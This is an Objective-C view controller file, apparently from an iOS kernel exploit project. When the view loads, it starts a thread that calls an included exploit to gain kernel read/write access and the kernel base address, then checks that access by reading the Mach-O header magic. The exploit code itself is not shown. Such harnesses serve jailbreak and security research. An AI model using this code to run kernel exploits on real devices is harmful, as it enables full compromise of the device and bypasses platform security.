#import "ViewController.h"

#include "exploit/exploit.h"
#include "exploit/kernel_rw.h"

#include <pthread.h>

static int go(void)
{
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");
    
    return 0;
}

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    pthread_t pt;
    pthread_create(&pt, NULL, (void *(*)(void *))go, NULL);
    
    // uncomment for synchronous
    // pthread_join(pt, NULL);
}


@end
